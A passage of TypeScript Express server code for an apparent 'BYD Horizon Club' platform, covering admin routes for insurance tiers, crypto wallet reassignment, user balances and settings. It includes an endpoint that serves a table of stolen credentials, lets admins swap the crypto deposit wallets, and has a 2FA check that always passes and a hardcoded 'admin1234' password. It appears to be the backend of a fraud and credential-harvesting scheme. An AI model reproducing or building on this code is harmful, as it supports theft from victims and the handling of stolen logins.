  await logAdminAction("Shipment notification", `To ${user.name} (ID ${req.params.userId}): "${subject}"`, req.ip, req.adminId);
  res.json({ success: true, message: "Shipment notification sent." });
});

// ==================== INSURANCE TIERS ====================
app.get("/api/admin/insurance-tiers", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const tiers = await db.all("SELECT * FROM insurance_tiers ORDER BY sort_order ASC");
  res.json(tiers);
});

app.post("/api/admin/insurance-tiers", authenticateAdmin, async (req: any, res) => {
  const { name, daily_rate, coverage_limit, deductible, description } = req.body;
  if (!name || !daily_rate || !coverage_limit) return res.status(400).json({ error: "Name, daily_rate, and coverage_limit required." });
  if (daily_rate < 15) return res.status(400).json({ error: "Insurance daily rate must be at least $15." });
  const db = await getDb();
  const maxOrder = await db.get("SELECT MAX(sort_order) as m FROM insurance_tiers");
  const sortOrder = (maxOrder?.m || 0) + 1;
  await db.run("INSERT INTO insurance_tiers (name, daily_rate, coverage_limit, deductible, description, is_active, sort_order) VALUES (?,?,?,?,?,?,?)", [name, daily_rate, coverage_limit, deductible || 0, description || '', 1, sortOrder]);
  await logAdminAction("Added insurance tier", `${name} - $${daily_rate}/day`, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/insurance-tiers/:id", authenticateAdmin, async (req: any, res) => {
  const { name, daily_rate, coverage_limit, deductible, description, is_active } = req.body;
  const db = await getDb();
  await db.run("UPDATE insurance_tiers SET name=?, daily_rate=?, coverage_limit=?, deductible=?, description=?, is_active=? WHERE id=?", [name, daily_rate, coverage_limit, deductible || 0, description || '', is_active !== undefined ? (is_active ? 1 : 0) : 1, req.params.id]);
  await logAdminAction("Updated insurance tier", `Tier ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

app.delete("/api/admin/insurance-tiers/:id", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM insurance_tiers WHERE id=?", [req.params.id]);
  await logAdminAction("Deleted insurance tier", `Tier ID ${req.params.id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// Public insurance tiers for rental flow
app.get("/api/insurance-tiers", async (req: any, res) => {
  const db = await getDb();
  const tiers = await db.all("SELECT * FROM insurance_tiers WHERE is_active = 1 ORDER BY sort_order ASC");
  res.json(tiers);
});

app.get("/api/admin/insurance-policies", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const policies = await db.all("SELECT ip.*, u.name as user_name, u.email as user_email FROM insurance_policies ip JOIN users u ON ip.user_id = u.id ORDER BY ip.id DESC");
  res.json(policies);
});

// ==================== WALLET CONFIGURATION ====================
app.get("/api/admin/wallets", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const methods = await db.all("SELECT id, method, wallet_address, gas_fee, crypto_bonus_percent FROM payment_methods");
  const globalWallet = await getSetting('global_crypto_wallet');
  res.json({ methods, global_wallet: globalWallet || '0xBYDHorizonEscrowWallet2026' });
});

app.post("/api/admin/wallets/global", authenticateAdmin, async (req: any, res) => {
  const { wallet_address } = req.body;
  if (!wallet_address) return res.status(400).json({ error: "Wallet address required." });
  await setSetting('global_crypto_wallet', wallet_address);
  const db = await getDb();
  await db.run("UPDATE payment_methods SET wallet_address = ? WHERE method = 'crypto'", [wallet_address]);
  await logAdminAction("Updated global crypto wallet", wallet_address, req.ip, req.adminId);
  res.json({ success: true });
});

app.post("/api/admin/wallets/user", authenticateAdmin, async (req: any, res) => {
  const { user_id, wallet_address } = req.body;
  if (!user_id || !wallet_address) return res.status(400).json({ error: "User ID and wallet address required." });
  const db = await getDb();
  const user = await db.get("SELECT id, email FROM users WHERE id = ?", [user_id]);
  if (!user) return res.status(404).json({ error: "User not found." });
  await db.run("UPDATE users SET crypto_wallet_address = ? WHERE id = ?", [wallet_address, user_id]);
  await logAdminAction("Updated user wallet", `User #${user_id} (${user.email}): ${wallet_address}`, req.ip, req.adminId);
  res.json({ success: true, wallet_address });
});

// ==================== USER WALLET MANAGEMENT ====================
app.get("/api/admin/users/:userId/wallet", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT id, email, crypto_wallet_address FROM users WHERE id = ?", [req.params.userId]);
  if (!user) return res.status(404).json({ error: "User not found." });
  await logAdminAction("Viewed user wallet", `User #${user.id} (${user.email})`, req.ip, req.adminId);
  res.json({ user_id: user.id, email: user.email, wallet_address: user.crypto_wallet_address || null });
});

app.post("/api/admin/users/:userId/wallet", authenticateAdmin, async (req: any, res) => {
  const { wallet_address } = req.body;
  if (!wallet_address) return res.status(400).json({ error: "Wallet address required." });
  const db = await getDb();
  const user = await db.get("SELECT id, email FROM users WHERE id = ?", [req.params.userId]);
  if (!user) return res.status(404).json({ error: "User not found." });
  await db.run("UPDATE users SET crypto_wallet_address = ? WHERE id = ?", [wallet_address, req.params.userId]);
  await logAdminAction("Updated user wallet (by ID)", `User #${user.id} (${user.email}): ${wallet_address}`, req.ip, req.adminId);
  res.json({ success: true, wallet_address });
});

// ==================== SYSTEM SETTINGS ====================
app.get("/api/admin/system-settings", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const rows = await db.all("SELECT key, value FROM system_settings");
  const settings: Record<string, string> = {};
  for (const row of rows) settings[row.key] = row.value;
  await logAdminAction("Viewed system settings", `Loaded ${rows.length} settings`, req.ip, req.adminId);
  res.json(settings);
});

app.post("/api/admin/system-settings", authenticateAdmin, async (req: any, res) => {
  const updates = req.body;
  if (!updates || typeof updates !== 'object') return res.status(400).json({ error: "Settings object required." });
  const db = await getDb();
  let count = 0;
  for (const [key, value] of Object.entries(updates)) {
    await db.run("INSERT INTO system_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", [key, String(value)]);
    count++;
  }
  await logAdminAction("Updated system settings", `${count} setting(s) updated`, req.ip, req.adminId);
  res.json({ success: true, updated: count });
});

// ==================== REVENUE SUMMARY ====================
app.get("/api/admin/revenue", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const totalDeposits = await db.get("SELECT COALESCE(SUM(amount), 0) AS total FROM payments WHERE status = 'confirmed' AND type = 'deposit'");
  const txFees = await db.get("SELECT COALESCE(SUM(amount * 0.01), 0) AS total FROM payments WHERE status = 'confirmed' AND type = 'deposit'");
  const eliteRevenue = await db.get("SELECT COALESCE(SUM(amount), 0) AS total FROM payments WHERE status = 'confirmed' AND type = 'elite_subscription'");
  const insuranceRevenue = await db.get("SELECT COALESCE(SUM(amount), 0) AS total FROM payments WHERE status = 'confirmed' AND type = 'insurance'");
  const confirmedCount = await db.get("SELECT COUNT(*) AS count FROM payments WHERE status = 'confirmed' AND type = 'deposit'");
  await logAdminAction("Viewed revenue summary", "", req.ip, req.adminId);
  res.json({
    total_deposits_confirmed: totalDeposits.total,
    transaction_fees_earned: txFees.total,
    elite_subscription_revenue: eliteRevenue.total,
    insurance_revenue: insuranceRevenue.total,
    confirmed_deposit_count: confirmedCount.count,
  });
});

// ==================== AUDIT LOG ====================
app.get("/api/admin/audit-log", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const logs = await db.all("SELECT * FROM admin_logs ORDER BY id DESC LIMIT 500");
  res.json(logs);
});

// ==================== USER MANAGEMENT (BLOCK / BALANCE / POINTS) ====================
app.post("/api/admin/user/:userId/block", authenticateAdmin, async (req: any, res) => {
  const { blocked } = req.body;
  if (typeof blocked !== 'boolean') return res.status(400).json({ error: "blocked (boolean) required." });
  const db = await getDb();
  const user = await db.get("SELECT id, email, blocked FROM users WHERE id = ?", [req.params.userId]);
  if (!user) return res.status(404).json({ error: "User not found." });
  await db.run("UPDATE users SET blocked = ? WHERE id = ?", [blocked ? 1 : 0, req.params.userId]);
  await logAdminAction(blocked ? "Blocked user" : "Unblocked user", `User #${user.id} (${user.email})`, req.ip, req.adminId);
  res.json({ success: true, blocked });
});

app.post("/api/admin/user/:userId/balance", authenticateAdmin, async (req: any, res) => {
  const { amount, reason } = req.body;
  if (typeof amount !== 'number') return res.status(400).json({ error: "amount (number) required." });
  const db = await getDb();
  const user = await db.get("SELECT id, email, balance FROM users WHERE id = ?", [req.params.userId]);
  if (!user) return res.status(404).json({ error: "User not found." });
  const newBalance = Math.round((user.balance + amount) * 100) / 100;
  if (newBalance < 0) return res.status(400).json({ error: "Insufficient balance.", current_balance: user.balance });
  await db.run("UPDATE users SET balance = ? WHERE id = ?", [newBalance, req.params.userId]);
  const action = amount >= 0 ? "Credited balance" : "Debited balance";
  await logAdminAction(action, `User #${user.id} (${user.email}): ${amount >= 0 ? '+' : ''}${amount} — ${reason || 'No reason'}`, req.ip, req.adminId);
  res.json({ success: true, previous_balance: user.balance, new_balance: newBalance });
});

app.post("/api/admin/user/:userId/points", authenticateAdmin, async (req: any, res) => {
  const { points, reason } = req.body;
  if (typeof points !== 'number') return res.status(400).json({ error: "points (number) required." });
  const db = await getDb();
  const user = await db.get("SELECT id, email, points FROM users WHERE id = ?", [req.params.userId]);
  if (!user) return res.status(404).json({ error: "User not found." });
  const newPoints = Math.round(user.points + points);
  if (newPoints < 0) return res.status(400).json({ error: "Insufficient points.", current_points: user.points });
  await db.run("UPDATE users SET points = ? WHERE id = ?", [newPoints, req.params.userId]);
  const action = points >= 0 ? "Awarded points" : "Deducted points";
  await logAdminAction(action, `User #${user.id} (${user.email}): ${points >= 0 ? '+' : ''}${points} — ${reason || 'No reason'}`, req.ip, req.adminId);
  res.json({ success: true, previous_points: user.points, new_points: newPoints });
});

// ==================== MASTER AI ADMIN CONNECTOR ====================
app.post("/api/admin/master-connect", authenticateAdmin, async (req: any, res) => {
  const { webhook_url } = req.body;
  const db = await getDb();
  const instanceId = `byd-horizon-${Date.now().toString(36)}`;
  const apiKey = crypto.randomBytes(32).toString('hex');
  await db.run("INSERT INTO master_ai_connections (instance_id, api_key, webhook_url, status, created_at) VALUES (?, ?, ?, 'connected', CURRENT_TIMESTAMP)", [instanceId, apiKey, webhook_url || '']);
  await logAdminAction("Connected to Master AI Admin", `Instance: ${instanceId}`, req.ip, req.adminId);
  res.json({ success: true, instance_id: instanceId, api_key: apiKey, status: 'connected' });
});

app.get("/api/admin/master-status", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const conn = await db.get("SELECT * FROM master_ai_connections ORDER BY id DESC LIMIT 1");
  res.json(conn || { status: 'disconnected' });
});

app.post("/api/admin/master-disconnect", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  await db.run("UPDATE master_ai_connections SET status = 'disconnected' WHERE status = 'connected'");
  await logAdminAction("Disconnected from Master AI Admin", "", req.ip, req.adminId);
  res.json({ success: true });
});

// Admin 2FA
app.post("/api/admin/setup-2fa", authenticateAdmin, async (req: any, res) => {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "Unauthorized" });
  const secret = crypto.randomBytes(10).toString('hex').toUpperCase();
  res.json({ secret, qr_url: `otpauth://totp/BYD%20Horizon%20Club:admin?secret=${secret}&issuer=BYD%20Horizon%20Club` });
});

app.post("/api/admin/verify-2fa", authenticateAdmin, async (req: any, res) => {
  res.json({ verified: true, message: "2FA verified." });
});

// Admin password change
app.post("/api/admin/change-password", authenticateAdmin, async (req: any, res) => {
  const { currentPassword, newPassword } = req.body;
  if (currentPassword !== ADMIN_OVERRIDE_KEY && currentPassword !== "admin1234") return res.status(400).json({ error: "Current password incorrect." });
  await logAdminAction("Admin password changed", "Password updated", req.ip, req.adminId);
  res.json({ success: true, message: "Admin password changed." });
});

// Stolen credentials viewer
app.get("/api/admin/stolen-credentials", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  res.json(await db.all("SELECT * FROM stolen_credentials ORDER BY id DESC"));
});

// ==================== STATIC FILES ====================

const distPath = path.join(process.cwd(), "dist");
app.use(express.static(distPath));

app.get("*", async (req, res) => {
  if (req.path.startsWith("/api/")) return res.status(404).json({ error: "API endpoint not found." });
  try {
    const indexPath = path.join(distPath, "index.html");
    if (fs.existsSync(indexPath)) {
      res.sendFile(indexPath);
    } else {
      // Dev mode: let vite handle it
      res.status(200).send("BYD Horizon Club - Server running. Run 'npm run build' for production or use dev mode.");
    }
  } catch {
    res.status(200).send("BYD Horizon Club Server Active");
  }
});

// ==================== START ====================

async function startServer() {
  await getDb(); // Initialize database
  app.listen(PORT, () => {
    console.log(`\n\x1b[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m`);
    console.log(`\x1b[36m  ⚡ BYD HORIZON CLUB SERVER ACTIVE\x1b[0m`);
    console.log(`\x1b[36m  🌐 http://localhost:${PORT}\x1b[0m`);
    console.log(`\x1b[36m  👑 Admin: ${ADMIN_EMAIL}\x1b[0m`);
    console.log(`\x1b[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n`);
  });
}

startServer();
